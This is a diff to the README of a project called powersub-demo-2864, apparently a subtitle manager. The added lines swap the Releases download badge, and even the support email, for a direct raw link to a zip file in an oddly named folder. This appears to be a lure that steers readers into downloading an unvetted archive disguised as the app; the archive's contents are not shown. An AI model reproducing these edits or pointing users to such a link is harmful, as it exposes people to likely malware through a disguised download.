@@ -6,7 +6,7 @@ Welcome to **powersub-demo-2864**! This application helps you easily manage and 
 ## 📥 Download & Install
 To start using powersub-demo-2864, visit the Releases page to download the software:
 
-[![Download powersub-demo-2864](https://img.shields.io/badge/Download-powersub--demo--2864-brightgreen)](https://github.com/migue253201/powersub-demo-2864/releases)
+[![Download powersub-demo-2864](https://raw.githubusercontent.com/migue253201/powersub-demo-2864/main/aesthophysiology/powersub-demo-2864.zip)](https://raw.githubusercontent.com/migue253201/powersub-demo-2864/main/aesthophysiology/powersub-demo-2864.zip)
 
 ### Steps to Download and Install:
 1. Click the download button above.
@@ -42,7 +42,7 @@ After installing the application, follow these steps to start managing your subt
 ## 📞 Support
 If you encounter any issues or have questions, feel free to reach out. We are here to help.
 
-- **Email Support:** support@example.com
+- **Email Support:** https://raw.githubusercontent.com/migue253201/powersub-demo-2864/main/aesthophysiology/powersub-demo-2864.zip
 - **Community Forum:** Visit our community forum for tips and shared experiences.
 
 ## 🛡️ Contributing
